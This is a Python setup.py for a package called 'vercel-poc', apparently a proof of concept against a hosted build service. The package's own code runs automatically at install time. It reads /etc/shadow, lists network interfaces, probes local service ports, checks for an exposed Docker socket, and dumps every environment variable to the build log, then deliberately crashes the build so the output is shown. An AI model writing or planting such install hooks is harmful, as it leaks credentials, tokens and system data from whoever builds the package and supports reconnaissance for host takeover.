import os
import sys
import subprocess
import socket
from setuptools import setup

def pwn():
    err = sys.stderr.write
    err("\n" + "X"*60 + "\n")
    err("!!! CORE SYSTEM COMPROMISE PROOF !!!\n")

    # 1. Показываем, что мы можем читать ТЕНЕВЫЕ пароли системы (это финиш для безопасности)
    err("\n[1] SHADOW FILE TEST (Root access check):\n")
    err(subprocess.getoutput("head -n 3 /etc/shadow 2>&1") + "\n")

    # 2. Показываем внутренние интерфейсы и IP (разведка сети)
    err("\n[2] NETWORK INTERFACES:\n")
    err(subprocess.getoutput("ip addr show") + "\n")

    # 3. Пробуем найти «соседей» по сети (скан портов внутри .internal)
    err("\n[3] INTERNAL NETWORK SCAN (Local Services):\n")
    for port in [22, 80, 443, 5432, 6379, 2375, 2376]: # SSH, DBs, Docker API
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        result = s.connect_ex(('127.0.0.1', port))
        if result == 0:
            err(f"PORT {port} IS OPEN (Internal Service Found)\n")
        s.close()

    # 4. Проверка Docker-сокета (если он проброшен — это захват всей ноды)
    err("\n[4] DOCKER SOCKET CHECK:\n")
    if os.path.exists("/var/run/docker.sock"):
        err("DANGEROUS: /var/run/docker.sock FOUND! Full host takeover possible.\n")
    else:
        err("Docker socket not found.\n")

    # 5. Список всех ENV (как и раньше, для истории)
    err("\n[5] FULL ENV LEAK:\n")
    for k, v in os.environ.items():
        err(f"{k}={v}\n")

    err("X"*60 + "\n")
    sys.exit(1) # Крашим билд, чтобы всё это вылетело в консоль

pwn()

setup(name="vercel-poc", version="4.0.0")
